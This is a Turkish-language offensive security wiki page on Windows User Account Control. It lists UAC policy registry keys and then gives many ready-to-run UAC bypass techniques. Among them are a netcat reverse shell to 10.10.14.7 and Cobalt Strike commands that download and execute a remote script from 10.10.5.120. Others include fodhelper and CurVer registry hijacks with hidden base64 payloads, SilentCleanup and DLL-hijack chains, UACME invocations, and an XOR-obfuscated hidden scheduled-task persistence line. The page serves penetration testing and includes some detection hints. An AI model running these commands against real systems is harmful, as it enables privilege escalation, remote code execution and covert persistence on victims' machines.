# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için bir onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyeye** sahip bir program, **sistemi potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkinleştirildiğinde, bir yönetici uygulamaların/görevlerin çalışması için sisteme yönetici düzeyinde erişime sahip olmasını açıkça yetkilendirmediği sürece, uygulamalar ve görevler her zaman **yönetici olmayan bir hesabın güvenlik bağlamında çalışır**. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir; ancak bir security boundary olarak kabul edilmez.<sup>[[2]](#references)</sup>

integrity levels hakkında daha fazla bilgi için:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC devrede olduğunda, yönetici kullanıcıya 2 token verilir: normal işlemleri medium integrity seviyesinde gerçekleştirmek için standart kullanıcı token'ı ve yönetici ayrıcalıklarına sahip bir token.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin nasıl çalıştığını ayrıntılı olarak açıklar ve logon sürecini, kullanıcı deneyimini ve UAC mimarisini içerir.<sup>[[2]](#references)</sup> Yöneticiler, UAC'nin nasıl çalışacağını kuruluşlarına özel olarak yerel düzeyde (secpol.msc kullanarak) yapılandırmak veya bir Active Directory domain ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtmak için security policies kullanabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak açıklanmıştır. UAC için ayarlanabilen 10 Group Policy ayarı vardır. Aşağıdaki tablo ek ayrıntılar sağlar:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Yerleşik Administrator hesabı için Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Admin Approval Mode'daki yöneticiler için elevation prompt davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Standart kullanıcılar için elevation prompt davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Uygulama kurulumlarını algıla ve elevation iste](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Yalnızca imzalanmış ve doğrulanmış executable'ları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Yalnızca güvenli konumlara yüklenmiş UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Tüm yöneticileri Admin Approval Mode'da çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: UIAccess uygulamalarının secure desktop kullanmadan elevation istemesine izin ver](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Elevation istenirken secure desktop'a geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Dosya ve registry yazma hatalarını kullanıcıya özel konumlara virtualize et](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows'ta software yüklemeye yönelik Policies

**local security policies** (çoğu sistemde "secpol.msc"), varsayılan olarak **yönetici olmayan kullanıcıların software yüklemesini önleyecek** şekilde yapılandırılmıştır. Bu, yönetici olmayan bir kullanıcı software'inizin installer'ını indirebilse bile, yönetici hesabı olmadan bunu çalıştıramayacağı anlamına gelir.

### UAC'nin Elevation İstemesini Zorlayan Registry Keys

Yönetici haklarına sahip olmayan standart bir kullanıcı olarak, "standart" hesabın belirli eylemleri gerçekleştirmeye çalıştığında **UAC tarafından credentials istenmesini** sağlayabilirsiniz. Bu işlem, **registry keys** değiştirilmesini gerektirir; bir **UAC bypass** yoksa veya saldırgan zaten admin olarak logon olmuş değilse, bunun için admin permissions gerekir.

Kullanıcı **Administrators** grubunda olsa bile bu değişiklikler, yönetimsel eylemleri gerçekleştirmek için kullanıcının **hesap credentials'ını yeniden girmesini** zorunlu kılar.

**In practice this is only useful once you already have an elevated token, a UAC bypass, or a misconfiguration that lets you change these keys; otherwise the registry write itself is blocked.**

Değiştirmeniz gereken registry keys ve entries aşağıdakilerdir (varsayılan değerleri parantez içinde):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Bu işlem Local Security Policy aracı üzerinden manuel olarak da yapılabilir. Değiştirildikten sonra yönetimsel işlemler, kullanıcının credentials'larını yeniden girmesini ister.

### Note

**User Account Control bir security boundary değildir.** Bu nedenle standart kullanıcılar, local privilege escalation exploit'i olmadan hesaplarından çıkıp admin hakları elde edemez.

### Bir kullanıcıdan 'full computer access' isteme
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Ayrıcalıkları

- Internet Explorer Protected Mode, yüksek bütünlük düzeyine sahip işlemlerin (web tarayıcıları gibi) düşük bütünlük düzeyindeki verilere (geçici Internet dosyaları klasörü gibi) erişmesini önlemek için bütünlük denetimlerini kullanır. Bu işlem, tarayıcının düşük bütünlük seviyesine sahip bir token ile çalıştırılmasıyla gerçekleştirilir. Tarayıcı, düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında işletim sistemi işlemin bütünlük seviyesini denetler ve erişime buna göre izin verir. Bu özellik, remote code execution saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
- Bir kullanıcı Windows'ta oturum açtığında sistem, kullanıcının ayrıcalıklarının bir listesini içeren bir access token oluşturur. Ayrıcalıklar, kullanıcının hakları ve yeteneklerinin birleşimi olarak tanımlanır. Token ayrıca kullanıcının kimlik bilgileri listesini de içerir; bunlar, kullanıcının bilgisayarda ve ağdaki kaynaklarda kimliğini doğrulamak için kullanılan kimlik bilgileridir.

### Autoadminlogon

Windows'u başlangıçta belirli bir kullanıcıyla otomatik olarak oturum açacak şekilde yapılandırmak için **`AutoAdminLogon` registry key** değerini ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı registry'de açığa çıkardığı için bunu yalnızca güvenli sistemlerde kullanın.

Aşağıdaki key'leri Registry Editor veya `reg add` kullanarak ayarlayın:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal oturum açma davranışına geri dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.

## UAC bypass

> [!TIP]
> Victim'a graphical access erişiminiz varsa UAC bypass işleminin oldukça kolay olduğunu unutmayın; UAC prompt göründüğünde "Yes" seçeneğine tıklamanız yeterlidir.

UAC bypass aşağıdaki durumda gereklidir: **UAC etkin, process'iniz medium integrity context içinde çalışıyor ve user'ınız administrators grubuna dahil.**

UAC en yüksek güvenlik seviyesindeyse (Always), diğer seviyelerden herhangi birinde (Default) olduğuna kıyasla bypass edilmesinin **çok daha zor** olduğunu belirtmek önemlidir.

### Medium-integrity shell üzerinden hızlı triage

Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve host build'ini bilinen çalışan yöntemlerle eşleştirin:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Pratik notlar:
- `EnableLUA=0` ise bypass işlemine gerek yoktur: herhangi bir admin token doğrudan high integrity isteğinde bulunabilir.
- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM-based bypasses için yaygın senaryodur.
- `Always Notify` çıtayı yükseltir, ancak başarısız olduğunu varsaymak yerine yine de tam build'i test etmelisiniz: UACME, modern Windows build'lerinde hâlâ bazı `AlwaysNotify compatible` yöntemleri takip etmektedir.<sup>[[3]](#references)</sup>

### UAC devre dışı

UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`** değerindeyse), aşağıdakine benzer bir yöntem kullanarak **admin ayrıcalıklarıyla** (high integrity level) bir reverse shell **çalıştırabilirsiniz**:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Token duplication ile UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Yerel RPC + yeniden kullanılabilir debug nesnesi

AppInfo yerel RPC arayüzü `201ef99a-7fa0-444c-9399-19ba84f12a1a`, debugging etkinleştirilmiş bir process oluşturabilir. Aynı thread üzerinde debug ile oluşturulan process'ler thread'in debug nesnesini paylaşır; bir oluşturma debug olayı, RPC sonucunun kendisi yalnızca sınırlı erişim verse bile tam erişimli bir process handle taşır. Bu durum, Administrators grubunun medium-integrity üyesi için debug nesnesinin yeniden kullanılmasını bir UAC primitive'ine dönüştürür.<sup>[[11]](#references)[[12]](#references)</sup>

Pratik bir zincir şöyledir:<sup>[[11]](#references)[[12]](#references)</sup>

1. Yerel RPC metodunu (`NdrAsyncClientCall` aracılığıyla veya doğrudan) kullanarak debugging etkinleştirilmiş, non-elevated bir kurban process oluşturun.
2. `NtQueryInformationProcess` ile `ProcessDebugObjectHandle` sorgulayın, `NtRemoveProcessDebug` ile bağlantısını ayırın, nesneyi koruyun ve kurban process'i sonlandırın.
3. Aynı RPC arayüzünü kullanarak güvenilir, otomatik olarak elevated olan bir process oluşturun; ardından `DbgUiSetThreadDebugObject` aracılığıyla kaydedilen nesneyi çağıran thread ile ilişkilendirin.
4. `WaitForDebugEvent` çağrısını yapın ve `CREATE_PROCESS_DEBUG_EVENT` process handle'ını alın; devam etmeden önce `NtDuplicateObject` ile handle'ı çoğaltın.
5. Çoğaltılan handle'ı `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` işlevine sağlayın ve extended startup-info yapısıyla payload'ı başlatın. Bu, hem elevated process context'ini yeniden kullanır hem de child process'e güvenilir görünen bir parent ilişkisi verir.

Yalnızca auto-elevated binary'yi aramak yerine kısa diziye odaklanın: yerel AppInfo RPC process oluşturma, `ProcessDebugObjectHandle` sorguları, debugger detach/reattach işlemleri, hemen ardından gelen bir oluşturma-debug olayı, handle duplication ve kaydedilen parent'ı oluşturma API'lerini gerçekleştiren process ile eşleşmeyen bir child.<sup>[[12]](#references)</sup>

### **Çok** Basit UAC "bypass"ı (tam dosya sistemi erişimi)

Administrators grubunda bulunan bir kullanıcıyla bir shell'iniz varsa, SMB (dosya sistemi) üzerinden paylaşılan **C$**'ı yeni bir diske yerel olarak mount edebilir ve **dosya sistemindeki her şeye erişim** elde edebilirsiniz (Administrator home folder'ı bile).

> [!WARNING]
> **Görünüşe göre bu trick artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike ile UAC bypass

Cobalt Strike teknikleri yalnızca UAC en yüksek güvenlik seviyesine ayarlanmadıysa çalışır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için çeşitli modüllere sahiptir.

### Yükseltilmiş COM arayüzleri (`ICMLuaUtil` / `CMSTPLUA`)

Otomatik yükseltilen COM nesneleri, modern build'lerde pratik bir UAC saldırı yüzeyi olmaya devam ediyor. `ICMLuaUtil`, UACME tarafından güncel Windows dallarında hâlâ çalıştığı doğrulanan bir yöntem olarak takip ediliyor ve saldırı araçları, COM Elevation Moniker'ı çağırmadan önce etkileşimli bir masaüstü process'i, 64-bit çalıştırma ve bazen PEB/process masquerading'i birleştirerek `CMSTPLUA`'yı uyarlamaya devam ediyor.<sup>[[3]](#references)</sup>

Pratik ipuçları:
- Kullanıcının **interactive session**'ındaki (genellikle `explorer.exe` veya onun bir child process'i) **64-bit** bir process'i tercih edin.
- Ham bir shell başarısız olursa, naif bir `CreateProcess` wrapper'ı yerine bir BOF / UACME implementasyonundan yeniden deneyin.
- Child execution'ın **ayrı bir elevated process** içinde gerçekleşmesini bekleyin; birçok BOF mevcut beacon'ı yerinde yükseltmez.

### KRBUACBypass

Dokümantasyon ve tool: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploit'leri

[**UACME**](https://github.com/hfiref0x/UACME), UAC bypass tekniklerinden oluşan bir koleksiyondur. Visual Studio veya MSBuild ile derleyin; derleme birkaç executable oluşturur (örneğin, `Source\Akagi\output\x64\Debug\Akagi.exe`), bu nedenle hedef build'e uygun yöntemi seçin.<sup>[[3]](#references)</sup>\
Dikkatli olun: bazı bypass'lar kullanıcıyı uyarabilecek görünür programlar veya prompt'lar başlatır.<sup>[[3]](#references)</sup>

UACME, her tekniğin çalışmaya başladığı **build version** bilgisini içerir.<sup>[[3]](#references)</sup> Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak yapı sürümlerinden Windows sürümü olan `1607` değerini elde edebilirsiniz.

Pratik bir iş akışı, önce **host build'ini değerlendirmek**, ardından eşleşen yöntemi çalıştırmaktır:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage`, yerel build'i bilinen UAC yöntemleriyle hızlıca karşılaştırır; bu, geçersiz PoC'leri hızlıca elemek için kullanışlıdır.<sup>[[4]](#references)</sup>
- `UACME`, bir bypass'ı belirli bir build ile eşleştirmek için hâlâ en iyi public catalogue'dur. Version 3.7.1, 83–85 yöntemlerini ekledi; önceki release ise mevcut yöntemleri **Windows 11 25H2** üzerinde yeniden test etti. Eski bir PoC'nin değişiklik yapılmadan hâlâ geçerli olduğunu varsaymak yerine method table ve release notes'u tekrar kontrol edin.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify destekli WNF/UIAccess chain'leri (UACME 3.7.1)

`Always Notify`, her UAC bypass'ını ortadan kaldırmaz. UACME 3.7.1, user-controlled environment/protocol state'i elevated scheduled-task veya UIAccess davranışıyla birleştiren üç yeni x64 yöntemi uygular ve bunların tümünü `AlwaysNotify compatible` olarak işaretler:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`'in elevated `taskhostw.exe`'ye `unifiedconsent.dll` side-load ettirmesi için `SystemRoot`'u yönlendirin. UACME bunu Windows 10 build 19041'den itibaren takip eder.
- **84 — TabTip:** Aynı environment-variable primitive'ini UIAccess `TabTip.exe` üzerinde kullanın. Bu işlem build'e bağlı olarak `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` veya `rsaenh.dll` yükler; ardından ortaya çıkan high-integrity UIAccess context'inden pivot edin. UACME bunu Windows 8.1 / Server 2016'dan itibaren takip eder.
- **85 — Narrator:** Per-user `feedback-hub` protocol'ünü hijack edin, `Alt+CapsLock+F` ile Narrator'ı çalıştırın, ardından `OskSupport.dll` side-load eden yazılabilir bir `osk.exe` kopyası başlatın. Bu yöntem etkileşimli bir desktop gerektirir ve Windows 10 1809 / Server 2019'dan itibaren takip edilir.

Payload units ve Akagi'yi UACME'de belgelendiği şekilde build ettikten sonra, eşleşen method number'ı çağırın (optional command varsayılan olarak `cmd.exe`'dir):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Yöntem 84 ve 85, UIAccess/desktop interaction'a bağlıdır; bu nedenle Session 0'dan veya etkileşimli olmayan bir service shell'den değiştirilmeden çalışacaklarını beklemeyin. Üçü de environment/protocol state'i manipüle eder ve DLL'leri stage eder; implementation'ı inceleyin ve testten sonra bu artifact'leri kaldırın.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilen binary `fodhelper.exe`, modern Windows'ta auto-elevated'dır. Başlatıldığında, aşağıdaki per-user Registry path'ini `DelegateExecute` verb'ünü doğrulamadan sorgular. Buraya bir command yerleştirmek, Administrators grubunda bulunan bir kullanıcının Medium Integrity process'inin UAC prompt'u olmadan High Integrity process'i başlatmasına olanak tanır.

fodhelper tarafından sorgulanan Registry path'i:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell adımları (payload'unuzu ayarlayın, ardından tetikleyin)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- Geçerli kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/gevşek olduğunda çalışır (ek kısıtlamalar içeren Always Notify durumunda çalışmaz).
- 64-bit Windows üzerinde 32-bit bir process'ten 64-bit PowerShell başlatmak için `sysnative` path'ini kullanın.
- Payload herhangi bir command olabilir (PowerShell, cmd veya bir EXE path'i). Gizlilik için kullanıcı arayüzü istemlerinden kaçının.

#### CurVer/extension hijack variant (HKCU only)

Recent samples abusing `fodhelper.exe`, `DelegateExecute` kullanmaktan kaçınır ve bunun yerine per-user `CurVer` value üzerinden **`ms-settings` ProgID'sini redirect eder**. Auto-elevated binary, handler'ı hâlâ `HKCU` altında resolve ettiğinden, key'leri yerleştirmek için admin token gerekmez:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Yetki yükseltildikten sonra malware genellikle `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` olarak ayarlayarak **gelecekteki istemleri devre dışı bırakır**, ardından ek savunma atlatma işlemleri gerçekleştirir (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve yüksek bütünlük düzeyinde çalışmak üzere persistence mekanizmasını yeniden oluşturur. Tipik bir persistence görevi, diskte **XOR ile şifrelenmiş bir PowerShell scripti** saklar ve bunu her saat bellekte çözüp çalıştırır:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Bu varyant da dropper'ı temizler ve yalnızca staged payload'ları bırakır; bu nedenle detection, **`CurVer` hijack**'inin, `ConsentPromptBehaviorAdmin` üzerinde yapılan tampering'in, Defender exclusion oluşturulmasının veya PowerShell'i bellekte decrypt eden scheduled task'ların izlenmesine dayanır.<sup>[[5]](#references)</sup>

### `SilentCleanup` task üzerinden UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`, `cleanmgr.exe`'yi en yüksek ayrıcalıklarla başlatır ve `%windir%` değerini kullanıcı ortamından genişletir. `HKCU\Environment\windir` değerini kontrol ediyorsanız, bu genişletmeyi arbitrary bir komuta yönlendirebilir ve consent dialog olmadan high integrity elde edebilirsiniz.<sup>[[8]](#references)</sup> UACME tekniği aktif tutmaya devam ettiğinden ve güncel issue tracking, Windows 11 24H2'nin yalnızca küçük quoting ayarlamaları gerektirebileceğini gösterdiğinden, bu yöntem recent build'lerde hâlâ test edilmeye değerdir.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Bu build üzerinde görev yolu tırnak içine alıyorsa, payload'ı tırnakla bitirerek yeniden deneyin (örneğin `cmd.exe"`). Testten sonra `HKCU\Environment\windir` değerini her zaman temizleyin.

#### Daha fazla UAC bypass

UI akışlarını, COM nesnelerini veya masaüstü etkileşimini kötüye kullanan birçok klasik UAC bypass yöntemi, kurbanla **tam etkileşimli bir oturum** gerektirir; yaygın bir `nc.exe` shell'i veya **Session 0** içinde çalışan bir service çoğu zaman yeterli değildir.

Bunu genellikle bir **meterpreter** oturumu kullanarak çözebilirsiniz. **Session** değerinin **1** olduğu bir **process**'e migrate edin:

![Özel bir extension (.thm) için ms-settings'i yönlendirin ve bu extension'ı payload'ınıza eşleyin - Daha fazla UAC bypass: Bir meterpreter oturumu kullanarak bunu elde edebilirsiniz. Session... değerinin olduğu bir process'e migrate edin...](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### GUI ile UAC Bypass

Bir **GUI** erişiminiz varsa, UAC istemi göründüğünde **kabul edebilirsiniz**; teknik bir bypass'a gerçekten ihtiyacınız yoktur. Bu nedenle bir GUI oturumu elde etmek, UAC'nin eklediği pratik engeli aşmak için çoğu zaman yeterlidir.

Ayrıca, birinin kullanmakta olduğu bir GUI oturumu elde ederseniz (muhtemelen RDP üzerinden), **administrator olarak çalışan bazı araçlar** bulunabilir. Buradan, örneğin bir **cmd**'yi doğrudan **admin olarak çalıştırabilirsiniz**; [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi araçlarda UAC tarafından tekrar prompt gösterilmez. Bu biraz daha **stealthy** olabilir.

### Gürültülü brute-force UAC bypass

Gürültü kabul edilebilirse, [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir araç, kullanıcı kabul edene kadar tekrar tekrar elevation isteğinde bulunabilir.

### Kendi bypass'ınız - Temel UAC bypass metodolojisi

**UACME**'ye göz atarsanız, **birçok UAC bypass yönteminin DLL hijacking'i kötüye kullandığını** fark edersiniz (çoğunlukla elevated bir binary'ye, yazılabilir bir path'ten saldırgan kontrolündeki bir DLL yükleterek). [DLL hijacking zafiyetini nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate** olacak bir binary bulun (çalıştırıldığında high integrity level'da çalıştığını kontrol edin).
2. Procmon ile **DLL Hijacking** için zafiyetli olabilecek "**NAME NOT FOUND**" event'lerini bulun.
3. DLL'i bazı **protected path'lerin** (C:\Windows\System32 gibi) içine **yazmanız** gerekecektir; burada yazma izniniz yoktur. Bunu şu yöntemlerle aşabilirsiniz:
1. **wusa.exe**: Windows 7,8 ve 8.1. Bu araç high integrity level'dan çalıştırıldığı için bir CAB dosyasının içeriğini protected path'lerin içine çıkarmanıza izin verir.
2. **IFileOperation**: Windows 10.
4. DLL'inizi protected path'in içine kopyalayacak ve zafiyetli, autoelevated binary'yi çalıştıracak bir **script** hazırlayın.

### Başka bir UAC bypass tekniği

Bir **autoElevated binary**'nin çalıştırılacak bir **binary** veya **command**'in **name/path** bilgisini **registry**'den **okumaya** çalışıp çalışmadığını izlemekten oluşur (binary bu bilgiyi **HKCU** içinde arıyorsa daha ilginçtir).

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijacking ile UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, search order kullanarak `iscsiexe.dll` yüklemesi için kötüye kullanılabilen **auto-elevated** bir binary'dir. Kötü amaçlı bir `iscsiexe.dll` dosyasını **user-writable** bir klasöre yerleştirebilir ve ardından mevcut user `PATH` değerini (örneğin `HKCU\Environment\Path` üzerinden) bu klasörün aranmasını sağlayacak şekilde değiştirebilirseniz, Windows saldırganın DLL'ini elevated `iscsicpl.exe` process'i içinde **UAC prompt göstermeden** yükleyebilir.<sup>[[1]](#references)[[6]](#references)</sup>

Pratik notlar:
- Bu, mevcut user **Administrators** grubundaysa ancak UAC nedeniyle **Medium Integrity** seviyesinde çalışıyorsa kullanışlıdır.
- Bu bypass için **SysWOW64** kopyası önemlidir. **System32** kopyasını ayrı bir binary olarak değerlendirin ve davranışını bağımsız olarak doğrulayın.
